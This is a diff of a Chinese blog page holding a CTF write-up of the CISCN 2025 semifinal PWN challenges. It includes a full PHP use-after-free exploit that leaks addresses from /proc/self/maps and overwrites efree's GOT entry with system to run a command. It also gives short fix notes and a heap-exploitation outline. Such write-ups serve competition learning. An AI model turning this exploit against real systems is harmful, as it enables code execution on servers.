@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.inkey.top/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-03-17T09:46:34.000Z">
-<meta property="article:modified_time" content="2025-03-17T10:17:34.000Z">
+<meta property="article:modified_time" content="2025-03-17T10:17:34.735Z">
 <meta property="article:author" content="InkeyP">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ciscn">
@@ -342,7 +342,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
         <div class="label text-third-text-color text-sm">标签</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -350,7 +350,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -477,19 +477,9 @@
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
 			<h1 id="CISCN-2025-半决赛-PWN-AWDP"><a href="#CISCN-2025-半决赛-PWN-AWDP" class="headerlink" title="CISCN 2025 半决赛 PWN AWDP"></a>CISCN 2025 半决赛 PWN AWDP</h1><h1 id="php-master"><a href="#php-master" class="headerlink" title="php-master"></a>php-master</h1><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>导入docker，找到php.ini</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175335852.png"
-                      alt="image-20250317175335852"
-                ></p>
+<p><img lazyload src="/images/loading.svg" data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175335852.png" alt="image-20250317175335852"></p>
 <p>很明显是个php-pwn，找到这个vuln.so <code>find / -name &quot;vuln.so&quot;</code></p>
-<p>这是一个很简单的UAF，选择将<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175525895.png"
-                      alt="image-20250317175525895"
-                ></p>
+<p>这是一个很简单的UAF，选择将<img lazyload src="/images/loading.svg" data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175525895.png" alt="image-20250317175525895"></p>
 <p><code>*((_BYTE *)mp + 12) == 1</code> patch为 <code>*((_BYTE *)mp + 12) == 2</code></p>
 <p>让他free不了</p>
 <h2 id="break（赛后）"><a href="#break（赛后）" class="headerlink" title="break（赛后）"></a>break（赛后）</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) <span class="variable">$hex</span> .= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex64</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$value</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$hex64_table</span> = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="number">5</span> =&gt; <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="number">6</span> =&gt; <span class="string">&quot;6&quot;</span>,</span><br><span class="line">        <span class="number">7</span> =&gt; <span class="string">&quot;7&quot;</span>,</span><br><span class="line">        <span class="number">8</span> =&gt; <span class="string">&quot;8&quot;</span>,</span><br><span class="line">        <span class="number">9</span> =&gt; <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="number">10</span> =&gt; <span class="string">&quot;a&quot;</span>,</span><br><span class="line">        <span class="number">11</span> =&gt; <span class="string">&quot;b&quot;</span>,</span><br><span class="line">        <span class="number">12</span> =&gt; <span class="string">&quot;c&quot;</span>,</span><br><span class="line">        <span class="number">13</span> =&gt; <span class="string">&quot;d&quot;</span>,</span><br><span class="line">        <span class="number">14</span> =&gt; <span class="string">&quot;e&quot;</span>,</span><br><span class="line">        <span class="number">15</span> =&gt; <span class="string">&quot;f&quot;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$remainder</span> = <span class="variable">$value</span> % <span class="number">0x10</span>;</span><br><span class="line">        <span class="variable">$value</span> =  (<span class="keyword">int</span>)(<span class="variable">$value</span> / <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$hex64_table</span>[<span class="variable">$remainder</span>] . <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> . <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.28.so/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20210902\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">// echo $buffer.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">// echo $buffer;</span></span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex64</span>(<span class="variable">$libc_base</span>) . <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex64</span>(<span class="variable">$mod_base</span>) . <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$efree_addr</span> = <span class="variable">$mod_base</span> + <span class="number">0x4060</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">construct</span>(<span class="number">10</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">0</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">0</span>, <span class="title function_ invoke__">int2Str</span>(<span class="variable">$efree_addr</span>));</span><br><span class="line"><span class="title function_ invoke__">construct</span>(<span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">0</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">allocate</span>(<span class="number">1</span>, <span class="number">0x90</span>);</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">0</span>, <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">overwrite</span>(<span class="number">1</span>, <span class="title function_ invoke__">int2Str</span>(<span class="variable">$libc_base</span> + <span class="number">0x44af0</span>));</span><br><span class="line"><span class="title function_ invoke__">clear</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
@@ -497,13 +487,8 @@
 <p>UAF任意地址分配，改efree got表为system</p>
 <h1 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h1><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><p>一个简单的protobuf，堆溢出</p>
 <p>推销一下protobuf自动提取</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-285969.htm" >https://bbs.kanxue.com/thread-285969.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175749372.png"
-                      alt="image-20250317175749372"
-                ></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-285969.htm">https://bbs.kanxue.com/thread-285969.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317175749372.png" alt="image-20250317175749372"></p>
 <p>没有对size做检查，就memcpy，将memcpy长度patch为0x20即可</p>
 <h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> HeapPayload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HeapPayload</span> &#123;</span><br><span class="line">     <span class="type">int32</span> <span class="keyword">option</span> = <span class="number">1</span>;</span><br><span class="line">     <span class="type">int32</span> chunk_sizes = <span class="number">2</span>;</span><br><span class="line">     <span class="type">int32</span> heap_chunks_id = <span class="number">3</span>;</span><br><span class="line">     <span class="type">bytes</span> heap_content = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
@@ -511,23 +496,13 @@
 
 <p>打的是house of apple2，rip控制为setcontext，然后mprotect，orw</p>
 <h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h2><p><code>snprintf</code> 的参数顺序错了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180347961.png"
-                      alt="image-20250317180347961"
-                ></p>
+<p><img lazyload src="/images/loading.svg" data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180347961.png" alt="image-20250317180347961"></p>
 <p>应为<code>snprintf(s, maxlen, format);</code>，题目将maxlen放在后面，因此我们输入的是format，存在格串和堆溢出</p>
 <p>将参数位置调整回来即可</p>
 <h1 id="post-quantum"><a href="#post-quantum" class="headerlink" title="post_quantum"></a>post_quantum</h1><h2 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h2><p>好长的题目，不读不读（</p>
 <p>将<code>sub_1B90()</code>中两个free全nop掉就过了，不懂原理（（（🫠</p>
 <p>附一张排名</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180632006.png"
-                      alt="image-20250317180632006"
-                ></p>
+<p><img lazyload src="/images/loading.svg" data-src="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20250317180632006.png" alt="image-20250317180632006"></p>
 
 		</div>
 
@@ -594,9 +569,9 @@
 </a><a class="recommended-article-item" href="/202412/07/强网S8-final-JP/" title="强网S8-final-JP" rel="bookmark">
   <img src="/202412/07/强网S8-final-JP/qwb.jpg" alt="强网S8-final-JP" class="!max-w-none">
   <span class="title">强网S8-final-JP</span>
-</a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark">
-  <img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none">
-  <span class="title">WangDing-2024</span>
+</a><a class="recommended-article-item" href="/202405/19/ciscn-2024/" title="ciscn-2024" rel="bookmark">
+  <img src="/img/cover/2.png" alt="ciscn-2024" class="!max-w-none">
+  <span class="title">ciscn-2024</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
@@ -726,11 +701,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 18 篇文章
+                        共撰写了 21 篇文章
                     </span>
                     
                         <span>
-                            共 35.6k 字
+                            共 41.7k 字
                         </span>
                     
                 </p>
